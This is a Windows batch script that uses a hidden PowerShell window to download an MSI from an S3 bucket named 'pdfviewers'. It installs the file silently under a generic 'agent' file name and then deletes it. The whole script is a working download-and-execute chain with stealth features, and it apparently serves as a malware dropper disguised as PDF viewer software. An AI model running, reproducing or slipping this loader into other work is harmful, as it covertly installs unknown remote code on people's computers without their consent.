@echo off
setlocal

set "agents=%PUBLIC%\Documents\agent-c92d02.msi"
set "_url=https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%_url%', '%agents%')"

if exist "%agents%" msiexec /i "%agents%" /qn

timeout /t 5 /nobreak >nul
del "%agents%" /q >nul 2>&1
exit /b 0
